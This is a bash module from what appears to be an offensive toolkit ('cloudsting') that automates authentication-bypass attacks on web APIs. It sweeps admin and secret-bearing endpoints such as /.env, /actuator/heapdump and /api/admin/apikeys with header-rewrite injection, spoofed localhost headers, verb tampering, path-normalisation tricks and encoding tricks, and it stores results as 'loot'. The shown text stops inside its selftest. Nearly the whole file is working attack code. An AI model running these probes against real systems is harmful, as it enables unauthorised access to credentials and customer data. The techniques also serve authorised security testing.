#!/usr/bin/env bash
# 47_auth_bypass.sh — cloudsting module 47: the guard is on the door you were told about
# Verbs: --sweep | --check | --gaps | --methods | --headers | --case | --trailing | --encoding
#        --cgi | --probe | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# The root is derived from this file only after the core is sourced. Clear any
# inherited value first: a caller that itself sources the core would otherwise
# hand this module *its* directory, and the module would read its own name as
# a path.
unset CS_MOD_DIR

MODULE_ID="47_auth_bypass"
MOD_NAME="Authentication Bypass (the guard is on the route, not the resource)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

AB_RUN_ID="$CS_RUN_ID"
export AB_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/auth_bypass"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"

: "${AB_TIMEOUT:=10}"      # per-request wall clock
: "${AB_FOLLOW:=0}"        # follow redirects (a login bounce must stay visible)
: "${AB_LIMIT:=0}"         # 0 = the whole protected-path table
: "${AB_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/47}"

ab_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── what the guard is supposed to protect ────────────────────────
# A portal protects a handful of routes with a middleware and then mounts four
# more that bypass it. The rows here are the routes whose body is worth
# reading — each one leaks something specific when it answers unauthenticated.
#   <path>\t<what an unauthenticated 200 hands over>\t<severity-if-open>
ab_protected() {
    cat <<'PATHS'
/api/admin/users	the operator account list	critical
/api/admin/config	the portal's own secrets and endpoints	critical
/api/admin/export	the customer base as a file	critical
/api/admin/apikeys	long-lived credentials, mint and list	critical
/api/admin/audit	what the operator did, and who looked	high
/api/admin/subscribers	the full subscriber base	critical
/api/admin/blacklist	whose line is flagged for fraud	high
/api/admin/roles	which account may become an agent	critical
/api/users	account objects with email and phone	high
/api/accounts	account objects with balance	high
/api/me	the identity the request resolved to	medium
/api/internal/health	internal service table and versions	high
/api/internal/env	process environment	critical
/metrics	prometheus series names and targets	medium
/actuator/env	bound configuration including datasource URLs	critical
/actuator/heapdump	the heap, which contains every credential in memory	critical
/.env	database and third-party credentials	critical
/swagger-ui/index.html	the full API map with auth requirements	medium
/v3/api-docs	the full API map as json	medium
PATHS
}

# ── how a gateway is tricked into not adding the guard ───────────
# Each row rewrites the SAME protected path so the upstream resource resolves
# while the gateway's rule does not match.
#   <id>\t<how>\t<example on /api/admin/users>
ab_vectors() {
    cat <<'VECT'
header-x-original-url	proxy honours a client header naming the real path	-	X-Original-URL: /api/admin/users
header-x-rewrite-url	rewrite header, added by one proxy layer and trusted by the next	-	X-Rewrite-URL: /api/admin/users
header-x-forwarded-url	forwarded-url, same bug in a different vendor	-	X-Forwarded-URL: /api/admin/users
header-x-http-method-override	a GET becomes a DELETE upstream while the gateway sees GET	-	X-HTTP-Method-Override: DELETE
header-x-method-override	same, older spelling	-	X-Method-Override: DELETE
header-x-original-method	same, the servlet spelling	-	X-Original-Method: DELETE
trailing-slash	/api/admin/users/ is a different route to the same handler	/api/admin/users/	-
dot-segment	/api/admin/../admin/users normalises after the rule runs	/api/admin/./users	-
semicolon-matrix	java matrix params truncate the matched path	/api/admin/users;.json	-
null-byte	an embedded %00 truncates a regex check	/api/admin/users%00.html	-
suffix-ext	/api/admin/users.json names the same handler	/api/admin/users.json	-
suffix-semicolon	the struts/jersey matrix suffix	/api/admin/users;a=b	-
double-slash	/api//admin/users defeats a prefix rule anchored to /api/	/api//admin/users	-
double-encode	a rule decodes once and matches on the wrong layer	/api/%2561dmin/users	-
leading-slash	//api/admin/users is absolute to some parsers	//api/admin/users	-
case-variant	a case-sensitive rule over a case-insensitive router	/api/ADMIN/users	-
verb-options	OPTIONS skips the middleware on many stacks	-	OPTIONS
verb-head	HEAD skips the middleware on many stacks	-	HEAD
verb-trace	TRACE is rarely blocked and echoes the request	-	TRACE
VECT
}

# The verbs that a GET-only middleware never sees.
ab_methods() { printf '%s\n' GET HEAD POST PUT PATCH DELETE OPTIONS TRACE ; }

# ── one request ──────────────────────────────────────────────────
#   ab_get <method> <url> [headers…]
#   -> code \x1f hash \x1f bytes \x1f keys \x1f ctype \x1f body-path
ab_get() {
    local method="$1" url="$2"; shift 2
    local body; body="$(mktemp "$CS_SCRATCH/ab.XXXXXX")" 2>/dev/null || body="$OUT_DIR/.ab.$$"
    local -a args=(--silent --show-error --max-time "$AB_TIMEOUT" -X "$method"
                   --write-out '%{http_code}\t%{size_download}\t%{content_type}' --output "$body"
                   -A "$AB_UA" -H 'Accept: application/json, text/html, */*')
    [[ "$AB_FOLLOW" == "1" ]] && args+=(-L)
    local h
    for h in "$@"; do
        [[ -n "$h" ]] && args+=(-H "$h")
    done

    local meta code bytes ctype
    meta="$(curl "${args[@]}" "$url" 2>/dev/null)" || meta=""
    case "$meta" in
        [0-9][0-9][0-9]$'\t'*) IFS=$'\t' read -r code bytes ctype <<<"$meta" ;;
        *) code="000"; bytes=0; ctype="" ;;
    esac
    [[ -s "$body" ]] || : > "$body" 2>/dev/null || true

    local keys="" hash
    if head -c 1 "$body" 2>/dev/null | grep -q '[{\[]'; then
        keys="$(jq -r 'if type=="object" then (keys_unsorted|join(","))
                       elif type=="array" then "array:"+(length|tostring)
                       else "scalar" end' "$body" 2>/dev/null | head -c 400)"
    fi
    hash="$(cs_fingerprint "$(cat "$body" 2>/dev/null)")"
    # U+001F, not tab: an empty middle column under IFS=$'\t' collapses and
    # every later field slides left.
    printf '%s\037%s\037%s\037%s\037%s\037%s\n' \
        "${code:-000}" "$hash" "${bytes:-0}" "$keys" "${ctype:-none}" "$body"
}

# ── the verdict ──────────────────────────────────────────────────
# An auth bypass is a DELTA, never an absolute. A 200 on /api/admin/users means
# nothing until you know what the same path answers with the guard's control
# request. The control is the path with no trick applied:
#   control 401/403  and  variant 200 with structure   -> bypass
#   control 401/403  and  variant 200 with no structure -> needs-review
#   control 401/403  and  variant redirect to login     -> login-wall (no bug)
#   control 200                                        -> the path was never guarded
#   control 404                                        -> not-there (nothing to compare)
#   ab_verdict <control-code> <variant-code> <keys> <ctype> <control-body-hash> <body-hash>
ab_verdict() {
    local c_code="$1" v_code="$2" keys="$3" ctype="$4" c_hash="${5:-}" v_hash="${6:-}"

    # the control is asked with a HEAD so a dead host is not confused with a
    # refused path: 000 says nothing was ever reached, 404/410 says there is
    # no resource to compare against, and everything else is left to the
    # variant table.
    if [[ "$c_code" == "000" ]]; then
        printf 'unreachable\tcontrol-no-answer\t'; return
    fi
    if [[ "$c_code" == "404" || "$c_code" == "410" ]]; then
        printf 'not-there\tcontrol-404\t'; return
    fi

    case "$v_code" in
        000)     printf 'unreachable\tno-answer\t'; return ;;
        404|410) printf 'absent\tno-such-route\t'; return ;;
        405)     printf 'no-method\tmethod-not-claimed\t'; return ;;
        5*)      printf 'error\tserver-error\t'; return ;;
    esac

    # the control itself was open: nothing was bypassed, the route is just open
    case "$c_code" in
        200|201|202|204)
            printf 'unguarded\tcontrol-already-%s\t' "$c_code"; return ;;
    esac

    case "$c_code" in
        401|403) ;;
        *) printf 'inconclusive\tcontrol-%s\t' "$c_code"; return ;;
    esac

    case "$v_code" in
        401|403) printf 'guarded\tguard-held\t'; return ;;
        400|415|422) printf 'rejected\tvalidation-%s\t' "$v_code"; return ;;
        301|302|303|307|308) printf 'login-wall\tredirect-%s\t' "$v_code"; return ;;
        200|201|202|203|204) ;;
        *) printf 'inconclusive\tvariant-%s\t' "$v_code"; return ;;
    esac

    # the variant answered where the control was refused. The body decides
    # whether that is a leak or the login page rendered with a 200.
    if printf '%s' "$ctype" | grep -qi 'html'; then
        printf 'needs-review\t200-but-html\t'; return
    fi
    if [[ -n "$keys" && "$keys" != "scalar" ]]; then
        if [[ -n "$c_hash" && -n "$v_hash" && "$v_hash" == "$c_hash" ]]; then
            printf 'echo\tidentical-to-control\t'; return
        fi
        printf 'bypass\tstructured-200\t'; return
    fi
    printf 'needs-review\t200-without-structure\t'
}

# ── vector helpers ───────────────────────────────────────────────
# Each vector row is <id> <how> <path-or-dash> <header-or-dash>. Turn one into
# the argv a request needs, with the protected path substituted.
#   ab_vector_apply <path> <vector-id>
#   -> <method>\x1f<path>\x1f<header>
ab_vector_apply() {
    local path="$1" wanted="$2"
    local id how example header
    while IFS=$'\t' read -r id how example header; do
        [[ "$id" != "$wanted" ]] && continue
        local p="$example" h="$header" m="GET"
        # '-' in the path slot means "keep the protected path as written"
        case "$p" in
            -|"") p="$path" ;;
        esac
        # the header slot is either a 'Name: value' pair or a bare verb, which
        # the request then sends instead of GET
        case "$h" in
            -|"") h="" ;;
            GET|HEAD|POST|PUT|PATCH|DELETE|OPTIONS|TRACE)
                m="$h"; h="" ;;
        esac
        printf '%s\037%s\037%s\n' "$m" "$p" "$h"
        return 0
    done < <(ab_vectors)
    return 1
}

# ── verbs ────────────────────────────────────────────────────────
# --gaps <base>: the cheapest sweep there is. Every protected path, no token,
# plain GET. Whatever answers is a route the operator forgot to mount.
ab_cmd_gaps() {
    local base="${1:-}"
    [[ -z "$base" ]] && { ab_log "usage: --gaps <base-url>"; return 2; }
    [[ "$base" == http*://* ]] || base="https://$base"
    cs_row BASE "$base"

    local path what sev n=0 open=0
    while IFS=$'\t' read -r path what sev; do
        [[ -z "$path" ]] && continue
        n=$((n + 1))
        local r code hash bytes keys ctype body
        cs_split "$(ab_get GET "${base%/}${path}")" code hash bytes keys ctype body
        local verdict; verdict="$(ab_verdict 401 "$code" "$keys" "$ctype")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"
        printf 'gaps\t%s\t%s\t%s\n' "$path" "$code" "$sig" >> "$PROBE_FILE"
        case "$sig" in
            bypass|unguarded)
                open=$((open + 1))
                cs_row OPEN "$path" "code=$code" "$sig" "$what"
                printf '%s\t%s\t%s\n' "$path" "$code" "$sig" >> "$HIT_FILE"
                cs_findings_row "$MODULE_ID" "WEBAPI" "${base%/}${path}" "$(printf '%s' "$sev" | tr '[:lower:]' '[:upper:]')" \
                    "unauthenticated-$sig" "$path answers $code with no token — $what"
                ;;
            *)
                cs_row PATH "$path" "code=$code" "$sig"
                ;;
        esac
        rm -f "$body"
    done < <(ab_protected)
    cs_row SUMMARY "paths=$n open=$open"
    return 0
}

# --check <base> <path> [token]: one route, every vector, control first.
# This is the verb the GUI calls; it answers about one thing.
ab_cmd_check() {
    local base="${1:-}" path="${2:-}" token="${3:-}"
    if [[ -z "$base" || -z "$path" ]]; then
        ab_log "usage: --check <base-url> <protected-path> [bearer-token]"
        return 2
    fi
    [[ "$base" == http*://* ]] || base="https://$base"
    [[ "$path" != /* ]] && path="/$path"

    local -a auth=()
    [[ -n "$token" ]] && auth=(-H "Authorization: Bearer $token")

    # the control: the path exactly as the operator wrote it
    local c_code c_hash c_bytes c_keys c_ctype c_body
    cs_split "$(ab_get GET "${base%/}${path}" "${auth[@]}")" \
        c_code c_hash c_bytes c_keys c_ctype c_body
    rm -f "$c_body"
    cs_row CONTROL "${base%/}${path}" "code=$c_code" "bytes=$c_bytes" "keys=$c_keys"
    printf 'control\t-\t%s\tcontrol\n' "$c_code" >> "$PROBE_FILE"

    local id how example header tried=0 hits=0
    while IFS=$'\t' read -r id how example header; do
        [[ -z "$id" ]] && continue
        local plan method vpath vheader
        plan="$(ab_vector_apply "$path" "$id")" || continue
        cs_split "$plan" method vpath vheader

        local url="$vpath"
        [[ "$vpath" == http*://* ]] || url="${base%/}${vpath}"

        local -a hdrs=("${auth[@]}")
        [[ -n "$vheader" && "$vheader" != "-" ]] && hdrs+=(-H "$vheader")

        local code hash bytes keys ctype body
        cs_split "$(ab_get "$method" "$url" "${hdrs[@]}")" code hash bytes keys ctype body
        tried=$((tried + 1))

        local verdict; verdict="$(ab_verdict "$c_code" "$code" "$keys" "$ctype" "$c_hash" "$hash")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"
        printf 'vector\t%s\t%s\t%s\t%s\n' "$id" "$method" "$code" "$sig" >> "$PROBE_FILE"
        rm -f "$body"

        case "$sig" in
            bypass)
                hits=$((hits + 1))
                cs_row HIT "$id" "method=$method" "code=$code" "$(printf '%s' "$verdict" | cut -f2)"
                printf '%s\t%s\t%s\n' "$id" "$method" "$code" >> "$HIT_FILE"
                cs_findings_row "$MODULE_ID" "WEBAPI" "${base%/}${path}" "CRITICAL" "auth-bypass-$id" \
                    "$how — $method $url answers $code with $keys while the control answers $c_code"
                ;;
            needs-review)
                cs_row REVIEW "$id" "method=$method" "code=$code" "$(printf '%s' "$verdict" | cut -f2)" \
                    "answered where the control was $c_code; read the body before believing it"
                ;;
            echo)
                cs_row ECHO "$id" "method=$method" "code=$code" "same bytes as the control"
                ;;
            *)
                cs_row VECTOR "$id" "method=$method" "code=$code" "$sig"
                ;;
        esac
    done < <(ab_vectors)

    cs_row SUMMARY "vectors=$tried bypass=$hits control=$c_code"
    cs_row ARTIFACT "$PROBE_FILE" "$HIT_FILE"
    return 0
}

# --sweep <base> [token]: every protected path × every vector. The full grid;
# loud on stderr, one row per path, hits to the findings store.
ab_cmd_sweep() {
    local base="${1:-}" token="${2:-}"
    [[ -z "$base" ]] && { ab_log "usage: --sweep <base-url> [bearer-token]"; return 2; }
    [[ "$base" == http*://* ]] || base="https://$base"

    cs_row BASE "$base"
    local paths="$CS_SCRATCH/ab-paths.txt"
    ab_protected | cut -f1 > "$paths"
    if (( AB_LIMIT > 0 )); then
        head -n "$AB_LIMIT" "$paths" > "$paths.cut" && mv "$paths.cut" "$paths"
    fi
    local total; total="$(wc -l < "$paths" | tr -d ' ')"
    cs_row PATHS "$total"

    : > "$HIT_FILE"
    : > "$PROBE_FILE"
    local p done_n=0 hits=0
    while IFS= read -r p; do
        [[ -z "$p" ]] && continue
        done_n=$((done_n + 1))
        ab_log "($done_n/$total) $p"
        local out; out="$(ab_cmd_check "$base" "$p" "$token" 2>/dev/null)"
        local h s
        h="$(printf '%s' "$out" | awk -F'\t' '$1=="SUMMARY"{print $2}' | sed 's/.*bypass=//; s/ control.*//')"
        s="$(printf '%s' "$out" | awk -F'\t' '$1=="SUMMARY"{print $2}' | sed 's/bypass=[0-9]* //')"
        [[ -z "$h" ]] && h=0
        hits=$((hits + h))
        cs_row PATH "$p" "${s:-no-summary}" "bypass=$h"
    done < "$paths"

    cs_row SUMMARY "paths=$total bypass=$hits"
    cs_row ARTIFACT "$PROBE_FILE" "$HIT_FILE"
    return 0
}

# --methods <base> <path>: the verb axis on its own. A middleware that only
# inspects GET is the single most common bypass in a BFF.
ab_cmd_methods() {
    local base="${1:-}" path="${2:-}"
    if [[ -z "$base" || -z "$path" ]]; then
        ab_log "usage: --methods <base-url> <protected-path>"
        return 2
    fi
    [[ "$base" == http*://* ]] || base="https://$base"
    [[ "$path" != /* ]] && path="/$path"
    local url="${base%/}${path}"

    local c_code c_hash c_bytes c_keys c_ctype c_body
    cs_split "$(ab_get GET "$url")" c_code c_hash c_bytes c_keys c_ctype c_body
    rm -f "$c_body"
    cs_row CONTROL "$url" "code=$c_code"

    local m tried=0 hits=0
    while IFS= read -r m; do
        local code hash bytes keys ctype body
        cs_split "$(ab_get "$m" "$url")" code hash bytes keys ctype body
        local verdict; verdict="$(ab_verdict "$c_code" "$code" "$keys" "$ctype" "$c_hash" "$hash")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"
        tried=$((tried + 1))
        case "$sig" in
            bypass)
                hits=$((hits + 1))
                cs_row HIT "$m" "code=$code" "$sig" "GET answers $c_code; $m answers $code"
                cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "HIGH" "auth-bypass-method-$m" \
                    "$m answers $code while GET answers $c_code — the middleware only sees GET"
                ;;
            *) cs_row METHOD "$m" "code=$code" "$sig" ;;
        esac
        rm -f "$body"
    done < <(ab_methods)
    cs_row SUMMARY "methods=$tried bypass=$hits"
    return 0
}

# --case <base> <path>: the router folds case, the guard does not.
ab_cmd_case() {
    local base="${1:-}" path="${2:-}"
    if [[ -z "$base" || -z "$path" ]]; then
        ab_log "usage: --case <base-url> <protected-path>"
        return 2
    fi
    [[ "$base" == http*://* ]] || base="https://$base"
    [[ "$path" != /* ]] && path="/$path"

    local c_code c_hash c_bytes c_keys c_ctype c_body
    cs_split "$(ab_get GET "${base%/}${path}")" c_code c_hash c_bytes c_keys c_ctype c_body
    rm -f "$c_body"
    cs_row CONTROL "$path" "code=$c_code"

    local upper lower mixed
    upper="$(printf '%s' "$path" | tr '[:lower:]' '[:upper:]')"
    lower="$(printf '%s' "$path" | tr '[:upper:]' '[:lower:]')"
    # alternate the case on the last segment so the prefix rule still matches
    mixed="$(printf '%s' "$path" | sed -E 's#([a-z])([a-z]*)$#\U\1\E\2#')"

    local v variant tried=0 hits=0
    for v in "$upper" "$lower" "$mixed"; do
        [[ "$v" == "$path" ]] && continue
        variant="$v"
        local code hash bytes keys ctype body
        cs_split "$(ab_get GET "${base%/}${variant}")" code hash bytes keys ctype body
        local verdict; verdict="$(ab_verdict "$c_code" "$code" "$keys" "$ctype" "$c_hash" "$hash")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"
        tried=$((tried + 1))
        case "$sig" in
            bypass)
                hits=$((hits + 1))
                cs_row HIT "$variant" "code=$code" "case-variant"
                cs_findings_row "$MODULE_ID" "WEBAPI" "${base%/}${variant}" "CRITICAL" "auth-bypass-case" \
                    "$variant answers $code while $path answers $c_code — the router folds case and the guard does not"
                ;;
            *) cs_row VARIANT "$variant" "code=$code" "$sig" ;;
        esac
        rm -f "$body"
    done
    cs_row SUMMARY "variants=$tried bypass=$hits"
    return 0
}

# --trailing <base> <path>: the slash, the dot, the semicolon, the extension.
ab_cmd_trailing() {
    local base="${1:-}" path="${2:-}"
    if [[ -z "$base" || -z "$path" ]]; then
        ab_log "usage: --trailing <base-url> <protected-path>"
        return 2
    fi
    [[ "$base" == http*://* ]] || base="https://$base"
    [[ "$path" != /* ]] && path="/$path"
    local trimmed="${path%/}"

    local c_code c_hash c_bytes c_keys c_ctype c_body
    cs_split "$(ab_get GET "${base%/}${path}")" c_code c_hash c_bytes c_keys c_ctype c_body
    rm -f "$c_body"
    cs_row CONTROL "$path" "code=$c_code"

    local -a variants=(
        "${trimmed}/" "${trimmed}/." "${trimmed}//" "${trimmed}/./" "${trimmed}/../$(basename "$trimmed")"
        "${trimmed}.json" "${trimmed}.xml" "${trimmed}.html" "${trimmed};" "${trimmed};.json"
        "${trimmed};a=b" "${trimmed}%00" "${trimmed}%20" "${trimmed}?" "${trimmed}#"
        "${trimmed}/%2e%2e/$(basename "$trimmed")" "${trimmed}%2f" "${trimmed}/%2f"
        "${trimmed}..;/" "/${trimmed#/}/"
    )

    local v tried=0 hits=0
    for v in "${variants[@]}"; do
        [[ -z "$v" ]] && continue
        local code hash bytes keys ctype body
        cs_split "$(ab_get GET "${base%/}${v}")" code hash bytes keys ctype body
        local verdict; verdict="$(ab_verdict "$c_code" "$code" "$keys" "$ctype" "$c_hash" "$hash")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"
        tried=$((tried + 1))
        case "$sig" in
            bypass)
                hits=$((hits + 1))
                cs_row HIT "$v" "code=$code" "path-normalisation"
                cs_findings_row "$MODULE_ID" "WEBAPI" "${base%/}${v}" "CRITICAL" "auth-bypass-normalisation" \
                    "$v reaches the same handler as $path but dodges the guard (control $c_code)"
                ;;
            *) cs_row VARIANT "$v" "code=$code" "$sig" ;;
        esac
        rm -f "$body"
    done
    cs_row SUMMARY "variants=$tried bypass=$hits"
    return 0
}

# --headers <base> <path>: only the header-injection family, one row each, so
# an operator can see a gateway that trusts a client header.
ab_cmd_headers() {
    local base="${1:-}" path="${2:-}" token="${3:-}"
    if [[ -z "$base" || -z "$path" ]]; then
        ab_log "usage: --headers <base-url> <protected-path> [bearer-token]"
        return 2
    fi
    [[ "$base" == http*://* ]] || base="https://$base"
    [[ "$path" != /* ]] && path="/$path"

    local -a auth=()
    [[ -n "$token" ]] && auth=(-H "Authorization: Bearer $token")

    local c_code c_hash c_bytes c_keys c_ctype c_body
    cs_split "$(ab_get GET "${base%/}${path}" "${auth[@]}")" c_code c_hash c_bytes c_keys c_ctype c_body
    rm -f "$c_body"
    cs_row CONTROL "$path" "code=$c_code"

    local -a probes=(
        "X-Original-URL: $path"
        "X-Rewrite-URL: $path"
        "X-Forwarded-URL: $path"
        "X-Original-URI: $path"
        "X-Forwarded-Prefix: $path"
        "X-Override-URL: $path"
        "X-HTTP-Method-Override: GET"
        "X-Method-Override: GET"
        "X-Original-Method: GET"
        "X-Forwarded-For: 127.0.0.1"
        "X-Forwarded-Host: localhost"
        "X-Real-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Trusted-Proxy: 1"
        "X-Internal-Request: true"
        "X-Admin: 1"
    )

    local h tried=0 hits=0 hname
    for h in "${probes[@]}"; do
        hname="${h%%:*}"
        # send the real path but cram the protected path into the header: a
        # root URL plus a header is the classic rewrite bug
        local code hash bytes keys ctype body
        cs_split "$(ab_get GET "${base%/}/" "${auth[@]}" -H "$h")" code hash bytes keys ctype body
        local verdict; verdict="$(ab_verdict "$c_code" "$code" "$keys" "$ctype" "$c_hash" "$hash")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"
        tried=$((tried + 1))
        case "$sig" in
            bypass)
                hits=$((hits + 1))
                cs_row HIT "$hname" "code=$code" "header-trusted"
                cs_findings_row "$MODULE_ID" "WEBAPI" "${base%/}" "CRITICAL" "auth-bypass-header-$hname" \
                    "the gateway trusts $hname from the client: $h reaches the backend while $path answers $c_code"
                ;;
            *) cs_row HEADER "$hname" "code=$code" "$sig" ;;
        esac
        rm -f "$body"
    done
    cs_row SUMMARY "headers=$tried bypass=$hits"
    return 0
}

# --encoding <base> <path>: the same path, written four other ways.
ab_cmd_encoding() {
    local base="${1:-}" path="${2:-}"
    if [[ -z "$base" || -z "$path" ]]; then
        ab_log "usage: --encoding <base-url> <protected-path>"
        return 2
    fi
    [[ "$base" == http*://* ]] || base="https://$base"
    [[ "$path" != /* ]] && path="/$path"

    local c_code c_hash c_bytes c_keys c_ctype c_body
    cs_split "$(ab_get GET "${base%/}${path}")" c_code c_hash c_bytes c_keys c_ctype c_body
    rm -f "$c_body"
    cs_row CONTROL "$path" "code=$c_code"

    # one pass of percent-encoding per character, a double-encoded first
    # segment, and a UTF-8 overlong — each defeats a different decoder
    local seg1="${path%%/*}"; seg1="/${path#/}"; seg1="${seg1%%/*}"
    local rest="${path#*/}"
    local doubled; doubled="$(printf '%s' "$rest" | sed 's#a#%2561#g; s#i#%2569#g; s#s#%2573#g; s#u#%2575#g')"
    local overlong; overlong="$(printf '%s' "$rest" | sed 's#a#%c0%a1#g; s#i#%c0%a9#g')"

    local -a variants=(
        "$(printf '%s' "$path" | sed 's#/#%2f#g')"
        "$(printf '%s' "$path" | sed 's#/#%252f#g')"
        "/${doubled}"
        "/${overlong}"
        "${path//\//%5c}"                      # backslash separators
        "$(printf '%s' "$path" | sed 's#\([a-z]\)#%\1#g')"
    )

    local v tried=0 hits=0
    for v in "${variants[@]}"; do
        [[ -z "$v" ]] && continue
        local code hash bytes keys ctype body
        cs_split "$(ab_get GET "${base%/}${v}")" code hash bytes keys ctype body
        local verdict; verdict="$(ab_verdict "$c_code" "$code" "$keys" "$ctype" "$c_hash" "$hash")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"
        tried=$((tried + 1))
        case "$sig" in
            bypass)
                hits=$((hits + 1))
                cs_row HIT "$v" "code=$code" "encoding"
                cs_findings_row "$MODULE_ID" "WEBAPI" "${base%/}${v}" "CRITICAL" "auth-bypass-encoding" \
                    "an encoded spelling of $path reaches the handler the guard refuses"
                ;;
            *) cs_row VARIANT "$v" "code=$code" "$sig" ;;
        esac
        rm -f "$body"
    done
    cs_row SUMMARY "variants=$tried bypass=$hits"
    return 0
}

# --cgi <base>: the PHP-family path-suffix hole. `/admin.php/anything` and
# `/anything.php/../admin.php` reach the same script through different routes,
# and a rule written against the literal filename misses both.
ab_cmd_cgi() {
    local base="${1:-}"
    [[ -z "$base" ]] && { ab_log "usage: --cgi <base-url> [script.php]"; return 2; }
    [[ "$base" == http*://* ]] || base="https://$base"
    local script="${2:-index.php}"

    cs_row BASE "$base"
    cs_row SCRIPT "$script"

    # the control is the script itself with no suffix
    local c_code c_hash c_bytes c_keys c_ctype c_body
    cs_split "$(ab_get GET "${base%/}/${script}")" c_code c_hash c_bytes c_keys c_ctype c_body
    rm -f "$c_body"
    cs_row CONTROL "/$script" "code=$c_code"

    local -a variants=(
        "/${script}/404.html"
        "/${script}/x.css"
        "/${script}/.css"
        "/${script}%2f"
        "/${script}/%2e%2e"
        "/${script}.bak"
        "/${script}~"
        "/${script}.swp"
        "/${script}.old"
        "/${script}/"
        "/./${script}"
        "//${script}"
        "/${script}%00"
    )

    local v tried=0 hits=0
    for v in "${variants[@]}"; do
        local code hash bytes keys ctype body
        cs_split "$(ab_get GET "${base%/}${v}")" code hash bytes keys ctype body
        # a PHP suffix executes the same script: the tell is not a 200 here,
        # it is a body identical to the control with a different route
        local verdict; verdict="$(ab_verdict "$c_code" "$code" "$keys" "$ctype" "$c_hash" "$hash")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"
        tried=$((tried + 1))
        if [[ "$sig" == "echo" || ( "$sig" == "bypass" && "$c_code" != "401" && "$c_code" != "403" ) ]]; then
            hits=$((hits + 1))
            cs_row HIT "$v" "code=$code" "same-script-different-route"
            cs_findings_row "$MODULE_ID" "WEBAPI" "${base%/}${v}" "MEDIUM" "path-suffix-executes" \
                "$v executes /$script and bypasses any rule written against the filename"
        else
            cs_row VARIANT "$v" "code=$code" "$sig"
        fi
        rm -f "$body"
    done
    cs_row SUMMARY "variants=$tried bypass=$hits"
    return 0
}

# --probe <url>: one url, the whole vector table, no base arithmetic. The verb
# for a URL you already hold.
ab_cmd_probe() {
    local url="${1:-}" token="${2:-}"
    [[ -z "$url" ]] && { ab_log "usage: --probe <full-url> [bearer-token]"; return 2; }
    local scheme_host path
    scheme_host="$(printf '%s' "$url" | sed -E 's#^([a-z]+://[^/]+).*#\1#')"
    path="$(printf '%s' "$url" | sed -E 's#^[a-z]+://[^/]+##')"
    [[ -z "$path" ]] && path="/"
    ab_cmd_check "$scheme_host" "$path" "$token"
}

ab_cmd_vectors() {
    local id how example header
    while IFS=$'\t' read -r id how example header; do
        [[ -z "$id" ]] && continue
        cs_row VECTOR "$id" "$how" "${example:--}" "${header:--}"
    done < <(ab_vectors)
    cs_row SUMMARY "vectors=$(ab_vectors | wc -l | tr -d ' ')"
    return 0
}

ab_cmd_paths() {
    local path what sev
    while IFS=$'\t' read -r path what sev; do
        [[ -z "$path" ]] && continue
        cs_row PATH "$path" "$what" "severity=$sev"
    done < <(ab_protected)
    cs_row SUMMARY "paths=$(ab_protected | wc -l | tr -d ' ')"
    return 0
}

ab_cmd_list() { ab_cmd_paths; }

ab_cmd_status_tsv() {
    local curl_state
    command -v curl >/dev/null 2>&1 && curl_state="curl-ok" || curl_state="curl-missing"
    printf '%s\t%s\t%s\tpaths-%s\tvectors-%s\tmethods-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" \
        "$(ab_protected | wc -l | tr -d ' ')" \
        "$(ab_vectors | wc -l | tr -d ' ')" \
        "$(ab_methods | wc -l | tr -d ' ')"
}

ab_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

ab_cmd_help() {
    cat <<'HELP'
cloudsting module 47 — Authentication Bypass v1.0.0
  --gaps <base>                     every protected path, plain GET, no token
  --check <base> <path> [token]     one route, the whole vector table, control first
  --sweep <base> [token]            every protected path x every vector
  --methods <base> <path>           the verb axis (HEAD/OPTIONS/TRACE/override)
  --headers <base> <path> [token]   only the gateway header-injection family
  --case <base> <path>              the case-fold axis
  --trailing <base> <path>          slash, dot, semicolon, extension, null
  --encoding <base> <path>          percent, double, overlong, backslash
  --cgi <base> [script.php]         the PHP path-suffix hole
  --probe <full-url> [token]        one url, no base arithmetic
  --paths | --vectors | --list | --status-tsv | --menu | --selftest | --help

An auth bypass is a DELTA, never an absolute. Every verb sends a control
request first — the path exactly as written, no trick — and only calls
something a bypass when the control was refused and the variant was not.
A 200 that is HTML is a login page rendered with a 200, so it is reported
as needs-review, never as a hit.

Environment: AB_TIMEOUT (10), AB_FOLLOW (0), AB_LIMIT (0), AB_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
ab_selftest() {
    cs_selftest_reset

    local n; n="$(ab_protected | wc -l | tr -d ' ')"
    chk paths-many    "$( (( n >= 16 )) && echo many || echo few )" "many"
    chk paths-3col    "$(ab_protected | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk paths-abs     "$(ab_protected | awk -F'\t' '$1 !~ /^\//{c++} END{print c+0}')" "0"
    chk paths-unique  "$(ab_protected | cut -f1 | sort -u | wc -l | tr -d ' ')" "$n"
    chk paths-sev     "$(ab_protected | awk -F'\t' '$3 !~ /^(critical|high|medium|low)$/{c++} END{print c+0}')" "0"
    chk paths-what    "$(ab_protected | awk -F'\t' '$2==""{c++} END{print c+0}')" "0"

    chk vectors-many  "$( (( $(ab_vectors | wc -l) >= 18 )) && echo many || echo few )" "many"
    chk vectors-4col  "$(ab_vectors | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
